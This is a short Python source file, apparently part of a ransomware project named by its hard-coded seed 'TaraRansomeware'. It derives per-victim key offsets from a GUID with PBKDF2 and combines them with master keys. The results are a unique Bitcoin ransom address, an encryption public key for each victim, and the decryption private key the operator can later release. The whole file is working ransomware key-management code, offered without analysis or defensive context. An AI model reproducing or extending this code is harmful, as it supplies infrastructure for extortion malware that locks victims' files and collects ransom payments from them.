from utils import *


class KeyDerivationFactory:
    def __init__(self, guid: str):
        seed = bytes('TaraRansomeware', 'utf-8')

        valid_btcPriv = False
        valid_cipPriv = False

        rcount = 128
        while not (valid_btcPriv and valid_cipPriv):
            rcount += 128
            extbytes = pbkdf2_hmac('sha256', unhexlify(guid), seed, rcount, 64)

            btcPriv = extbytes[:32]
            valid_btcPriv = isValidPrivKey(decode_privkey(btcPriv))

            cipPriv = extbytes[32:]
            valid_cipPriv = isValidPrivKey(decode_privkey(cipPriv))

        self.btcPriv = btcPriv
        self.cipPriv = cipPriv

    def get_cipher_public_key(self, mCipPub):
        cipPub = privkey_to_pubkey(self.cipPriv)
        return encode_pubkey(add_pubkeys(mCipPub, cipPub), 'hex_compressed')

    def get_bitcoin_address(self, mBtcPub):
        btcPub = privkey_to_pubkey(self.btcPriv)
        return pubkey_to_address(add_pubkeys(mBtcPub, btcPub))

    def get_cipher_private_key(self, mCipPriv):
        return encode_privkey(add_privkeys(mCipPriv, self.cipPriv), 'hex')

    def get_bitcoin_private_key_offset(self):
        return encode_privkey(self.btcPriv, 'hex')
